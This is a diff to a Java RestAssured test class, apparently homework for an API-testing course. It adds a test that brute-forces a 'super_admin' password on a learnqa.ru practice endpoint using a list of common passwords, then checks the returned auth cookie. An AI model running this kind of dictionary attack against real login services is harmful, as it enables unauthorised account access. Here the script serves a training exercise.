@@ -1,5 +1,3 @@
-import groovy.util.MapEntry;
-import io.restassured.http.Headers;
 import io.restassured.path.json.JsonPath;
 import io.restassured.response.Response;
 import org.junit.jupiter.api.Test;
@@ -7,11 +5,57 @@ import io.restassured.RestAssured;
 
 import java.util.HashMap;
 import java.util.Map;
-import java.util.Objects;
-import java.util.Optional;
 
 public class HelloWorldTest {
 
+    @Test
+    public void testCheckPasswordHack() {
+        String[] passwords= new String[] {"password","123456","123456789","12345678","12345",
+                "qwerty","abc123","football","1234567","monkey","111111","letmein","1234",
+                "1234567890","dragon","baseball","sunshine","iloveyou","trustno1","princess",
+                "adobe123[a]","123123","welcome","login","admin","qwerty123","solo","1q2w3e4r",
+                "master","666666","photoshop[a]","1qaz2wsx","qwertyuiop","ashley","mustang","121212",
+                "starwars","654321","bailey","access","flower","555555","passw0rd","shadow","lovely",
+                "7777777","michael","!@#$%^&*","jesus","password1","superman","hello","charlie","888888",
+                "696969","hottie","freedom","aa123456","qazwsx","ninja","azerty","loveme","whatever",
+                "donald","batman","zaq1zaq1","Football","000000","123qwe",};
+        Map<String,String> body = new HashMap<String,String>();
+        body.put("login","super_admin");
+
+        Response authResponse,authCheckResponse;
+        String authCookie = "", htmlResult="You are NOT authorized";
+        int index = -1;
+
+        while (htmlResult.equals("You are NOT authorized") && index<passwords.length) {
+            index++;
+            body.put("password",passwords[index]);
+            authResponse = RestAssured
+                    .given()
+                    .when()
+                    .body(body)
+                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
+                    .andReturn();
+            authCookie = authResponse.getCookie("auth_cookie");
+            if (authCookie != null && !authCookie.isEmpty()) {
+                authCheckResponse = RestAssured
+                        .given()
+                        .cookie("auth_cookie", authCookie)
+                        .when()
+                        .body(body)
+                        .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
+                        .andReturn();
+                htmlResult = authCheckResponse.htmlPath().get("html").toString();
+            } else {
+                System.out.println("Haven't gotten auth cookie");
+            }
+        }
+        if (!htmlResult.equals("You are NOT authorized")) {
+            System.out.println(htmlResult+
+                    "\nCorrect password is: "+passwords[index]);
+        }
+
+
+    }
     @Test
     public void testCheckTokenJob() {
         JsonPath responseJSON = RestAssured
